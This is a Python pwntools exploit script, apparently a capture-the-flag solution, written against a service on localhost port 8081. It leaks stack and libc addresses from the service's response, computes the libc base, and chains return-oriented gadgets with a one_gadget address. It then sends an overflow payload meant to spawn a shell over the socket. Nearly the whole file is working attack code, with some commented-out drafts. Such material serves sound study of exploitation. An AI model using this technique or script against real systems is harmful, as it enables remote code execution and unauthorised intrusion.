from pwn import *
from string import printable
from time import sleep

r = remote('localhost', 8081)

r.sendline("64")
r.sendline("a"*15)

resp = r.recv()
read = u64(resp[16:24])
stack = u64(resp[32:40])
libc = u64(resp[56:64])

# attackbuffer = stackleak - 272

stackleak = 32

# Use the first read+write to get a valid stack and libc address.
libc_offset = 133168
libc = libc - libc_offset

# 88 bytes between rsp and our buffer.
# 0x0000000000018809: ret 0x17;
# 0x0000000000008658: ret 0x53;

print("read @ {:016x}".format(read))
print("stack @ {:016x}".format(stack))
print("libc @ {:016x}".format(libc))

buf = stack-272

# break @ 400d1d

# pop rax; mov rsi, qword ptr [rsp + 0x48]; mov rdi, qword ptr [rsp + 0x40]; mov rax, qword ptr [rsp + 0x30]; call rax;
# 3. 0x00000000000d20f2: push rdi; ret;
# 0x0000000000026ca1: pop rax; mov rsi, qword ptr [rsp + 0x48]; mov rdi, qword ptr [rsp + 0x40]; mov rax, qword ptr [rsp + 0x30]; call rax;

# addr=0x000f78e0 off=0x000f78e0 ord=1680 fwd=NONE sz=90 bind=UNKNOWN type=FUNC name=close
# addr=0x000f7940 off=0x000f7940 ord=1392 fwd=NONE sz=33 bind=UNKNOWN type=FUNC name=dup

# 1. Take control of the stack and program counter.
# 2. Call close and dup (The socket is already given as input.)
# 3. Exec a shell.

"""
close(0);
close(1);
close(2);

if ( dup(sck) != 0 || dup(sck) != 1 || dup(sck) != 2 ) {
    perror("error duplicating socket for stdin/stdout/stderr");
    exit(1);
}
"""

"""
71 70 6f 6e 6d 6c 6b 6a
"""


r.sendline("512")
stack = libc+0x0000000000008658
chain = libc+0x0000000000026ca1

data = printable
func = p64(0x71706f6e6d6c6b6a)
rdi = p64(0x474645444342417a)

# data = data.replace(func, p64(libc+0x000f78e0))
# rdi = data.replace(rdi, p64(0))

print("func: {}".format(func))
print("rdi: {}".format(rdi))

# rsp+0x30
i=19

#data = data[:i] + p64(libc+0x000f78e0) + data[i+8:]
#data = data[:i+0x18] + p64(0) + data[i+0x18+8:]

onegadget = libc+0xf1147

# r.send("a"*16+p64(chain)+p64(stack)+data)
r.send("a"*16+p64(chain)+p64(onegadget)+data)

